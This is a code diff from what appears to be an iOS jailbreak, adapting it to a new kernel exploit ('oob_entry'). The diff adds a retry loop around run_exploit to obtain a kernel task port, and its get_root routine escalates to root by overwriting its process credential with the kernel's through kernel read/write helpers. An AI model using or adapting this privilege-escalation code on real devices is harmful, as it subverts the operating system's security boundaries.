@@ -20,7 +20,7 @@
 #include "common.h"
 #include "patches.h"
 #include "patchfinder.h"
-#include "exploit/s0cket.h"
+#include "exploit/oob_entry.h"
 
 
 #pragma mark - [*]--   Defines/Vars and Stuff   --[*]
@@ -34,8 +34,6 @@ extern char* const* environ;
 mach_port_t tfp0_port;
 uint32_t k_base;
 uint32_t kernel_slide;
-uint32_t tte_virt;
-uint32_t tte_phys;
 kdata_t kernel_data;
 uint32_t shc_base;
 uint32_t shc;
@@ -179,17 +177,17 @@ bool get_root(void) {
     uint32_t my_proc = 0;
     uint32_t my_cred = 0;
     pid_t my_pid = getpid();
-    uint32_t proc = rk32(k_base + _allproc);
+    uint32_t proc = kread32(k_base + _allproc);
     while (proc) {
-        uint32_t pid = rk32(proc + 8);
+        uint32_t pid = kread32(proc + 8);
         if (pid == my_pid) my_proc = proc;
         else if (pid == 0) k_proc = proc;
-        proc = rk32(proc);
+        proc = kread32(proc);
     }
 
-    my_cred = rk32(my_proc + 0x98);
-    uint32_t k_cred = rk32(k_proc + 0x98);
-    wk32(my_proc + 0x98, k_cred);
+    my_cred = kread32(my_proc + 0x98);
+    uint32_t k_cred = kread32(k_proc + 0x98);
+    kwrite32(my_proc + 0x98, k_cred);
     setuid(0);
     if (getuid() != 0) {status(@"[-] failed to get root\n");return false;}
     status(concat(@"[*] UID: %x\n", getuid()));
@@ -267,7 +265,7 @@ bool k_init(uint8_t *buf) {
 #pragma mark - [*]--   Main Jailbreak Functions   --[*]
 
 int jailbreak(mach_port_t tfp0) {
-    k_base = (uint32_t)get_k_base(tfp0);
+    k_base = kinfo->kernel_base;
     status(concat(@"[*] k_base: 0x%x\n", k_base));
     unsigned char *k_data = (unsigned char *)malloc(0x1800000);
     k_dumper(k_base, k_data, 0x1800000);
@@ -317,7 +315,17 @@ int start_jailbreak(void) {
     NSString *tweaks = [[NSUserDefaults standardUserDefaults] stringForKey:@"tweaks"];
     
     status(@"[*] starting exploit\n");
-    mach_port_t tfp0 = s0cket();
+    // hack, to just keep trying until it succeeds somehow
+    int ool_count = 1000;
+    int ret = -1;
+    while (ool_count >= 100 && ret != 0) {
+        print_log("[*] ool_count = %d\n", ool_count);
+        ret = run_exploit(ool_count);
+        if (ret == 0) break;
+        ool_count -= 100;
+        usleep(20000);
+    }
+    mach_port_t tfp0 = kinfo->tfp0;
 
     if (tfp0 != MACH_PORT_NULL) {
         tfp0_port = tfp0;
